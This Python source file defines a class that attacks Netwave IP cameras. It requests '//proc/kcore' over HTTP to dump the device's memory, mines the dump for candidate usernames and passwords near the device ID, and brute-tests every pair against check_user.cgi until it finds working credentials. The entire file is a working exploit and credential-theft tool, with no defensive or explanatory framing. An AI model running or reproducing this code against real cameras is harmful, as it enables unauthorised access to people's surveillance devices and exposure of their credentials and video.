from __future__ import annotations

import asyncio
import ipaddress
import itertools
import logging
import re
from typing import Any, List, Optional

import aiohttp
import binary2strings
from tenacity import retry

from .dataclasses import DeviceCredentials, ExtractedString

logger = logging.getLogger(__name__)


class NetwaveDevice:
    """A class for interacting with a Netwave IP camera."""

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port

        self._session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=8192),
            timeout=aiohttp.ClientTimeout(30),
        )

    def __str__(self) -> str:
        return f"{self.host}:{self.port}"

    def __repr__(self) -> str:
        return f"{self.__class__.__name__}(host={self.host}, port={self.port})"

    async def __aenter__(self) -> NetwaveDevice:
        return self

    async def __aexit__(self, *_: Any) -> None:
        await self.close()

    def _get_possible_credentials(
        self, device_id: str, memory: bytes
    ) -> List[DeviceCredentials]:
        """
        Get the possible credentials of the Netwave IP camera.

        Parameters
        ----------
        device_id : str
            The device ID of the Netwave IP camera.
        memory : bytes
            The memory dump of the Netwave IP camera.

        Returns
        -------
        List[DeviceCredentials]
            A list of possible credentials for the Netwave IP camera.
        """
        strings = [
            ExtractedString(*string)
            for string in binary2strings.extract_all_strings(memory)
        ]

        filtered_strings = self._filter_strings(device_id, strings)

        if not filtered_strings:
            return None

        possible_credentials = list(itertools.permutations(filtered_strings, 2))

        possible_credentials.sort(
            key=lambda credentials: "admin" in credentials[0].string, reverse=True
        )

        credentials = [
            DeviceCredentials(
                self.host, self.port, credentials[0].string, credentials[1].string
            )
            for credentials in possible_credentials
        ]

        credentials.extend(
            [
                DeviceCredentials(self.host, self.port, credentials[0].string)
                for credentials in possible_credentials
            ]
        )

        return credentials

    @staticmethod
    def _filter_strings(
        device_id: str, strings: List[ExtractedString]
    ) -> List[ExtractedString]:
        """
        Filter the strings that were extracted from the memory dump.

        Parameters
        ----------
        device_id : str
            The device ID of the Netwave IP camera.
        strings : List[ExtractedString]
            The strings that were extracted from the memory dump.

        Returns
        -------
        List[ExtractedString]
            The filtered strings.
        """
        filtered_strings = set()
        domain_pattern = re.compile(r"[a-z0-9-]+\.[a-z0-9-]+\.[a-z]+")
        email_pattern = re.compile(r"[a-z0-9_.+-]+@[a-z0-9-]+\.[a-z0-9-.]+")

        for string in itertools.dropwhile(lambda x: x.string != device_id, strings):
            string.string = string.string.strip()

            if not string.string:
                continue

            try:
                string.string.encode("ascii")
            except UnicodeEncodeError:
                continue

            try:
                ipaddress.ip_address(string.string)
            except ValueError:
                pass
            else:
                continue

            if (
                string.string != device_id
                and domain_pattern.fullmatch(string.string) is None
                and email_pattern.fullmatch(string.string) is None
                and not any(char in string.string for char in (" ", ":"))
                and string.encoding == "UTF8"
                and string.is_interesting
            ):
                filtered_strings.add(string)

        return list(filtered_strings)

    async def _get_credentials(
        self, device_id: str, *, timeout: int = 300
    ) -> DeviceCredentials:
        """
        Get the credentials of the Netwave IP camera.

        Parameters
        ----------
        device_id : str
            The device ID of the Netwave IP camera.
        timeout : int, optional
            The timeout in seconds for retrieving the credentials from the memory
            dump, by default 300.

        Returns
        -------
        DeviceCredentials
            The credentials of the Netwave IP camera.
        """
        async with self._session.get(
            f"http://{self}//proc/kcore", timeout=aiohttp.ClientTimeout(timeout)
        ) as response:
            if (
                response.status != 200
                or response.headers.get("Server") != "Netwave IP Camera"
            ):
                logger.error("[%s] Device is not vulnerable", self)
                return DeviceCredentials(self.host, self.port)

            logger.info("[%s] Dumping memory...", self)

            async for chunk in response.content.iter_any():
                possible_credentials = self._get_possible_credentials(device_id, chunk)

                if not possible_credentials:
                    continue

                logger.info(
                    "[%s] Found device ID in memory dump, looking for valid credentials...",
                    self,
                )

                for credentials in possible_credentials:
                    if await self._check_credentials(credentials):
                        if credentials.password is None:
                            logger.info(
                                "[%s] Found valid credentials: %s",
                                self,
                                credentials.username,
                            )
                        else:
                            logger.info(
                                "[%s] Found valid credentials: %s:%s",
                                self,
                                credentials.username,
                                credentials.password,
                            )

                        return credentials

                logger.error(
                    "[%s] Could not find valid credentials in memory dump", self
                )

                return DeviceCredentials(self.host, self.port)

            logger.error("[%s] Could not find device ID in memory dump", self)
            return DeviceCredentials(self.host, self.port)

    @retry
    async def _check_credentials(self, credentials: DeviceCredentials) -> bool:
        """
        Check if the given credentials are valid.

        Parameters
        ----------
        credentials : DeviceCredentials
            The credentials to check.

        Returns
        -------
        bool
            Whether the credentials are valid.
        """
        if credentials.password is None:
            auth = aiohttp.BasicAuth(credentials.username)
        else:
            auth = aiohttp.BasicAuth(credentials.username, credentials.password)

        async with await asyncio.shield(
            self._session.get(f"http://{self}/check_user.cgi", auth=auth)
        ) as response:
            if response.status == 200:
                return True

            return False

    async def close(self) -> None:
        """Close the session."""
        await self._session.close()

    async def get_device_id(self) -> Optional[str]:
        """
        Get the device ID of the Netwave IP camera.

        Returns
        -------
        Optional[str]
            The device ID of the Netwave IP camera.
            Returns None if the device ID could not be found.
        """
        async with self._session.get(f"http://{self}/get_status.cgi") as response:
            if response.status != 200:
                return None

            text = await response.text()

        for line in text.splitlines():
            device_id_match = re.match(r"var id=[\"'](\w+)[\"'];", line)

            if device_id_match is None:
                continue

            device_id = device_id_match.group(1)
            return device_id

    async def get_credentials(
        self, device_id: Optional[str] = None, *, timeout: int = 300
    ) -> DeviceCredentials:
        """
        Get the credentials of the Netwave IP camera.

        Parameters
        ----------
        device_id : str, optional
            The device ID of the Netwave IP camera.
            If None, the device ID will be retrieved, by default None.
        timeout : int, optional
            The timeout in seconds for retrieving the credentials, by default 300.

        Returns
        -------
        DeviceCredentials
            The credentials of the Netwave IP camera.
        """
        try:
            device_id = device_id or await self.get_device_id()
        except (asyncio.TimeoutError, aiohttp.ClientError):
            logger.error("[%s] Could not get device ID", self)
            return DeviceCredentials(self.host, self.port)

        if device_id is None:
            logger.error("[%s] Could not get device ID", self)
            return DeviceCredentials(self.host, self.port)

        logger.info("[%s] Device ID: %s", self, device_id)

        try:
            return await asyncio.wait_for(
                self._get_credentials(device_id, timeout=timeout), timeout
            )
        except (asyncio.TimeoutError, aiohttp.ClientError):
            logger.error("[%s] Could not get credentials", self)
            return DeviceCredentials(self.host, self.port)
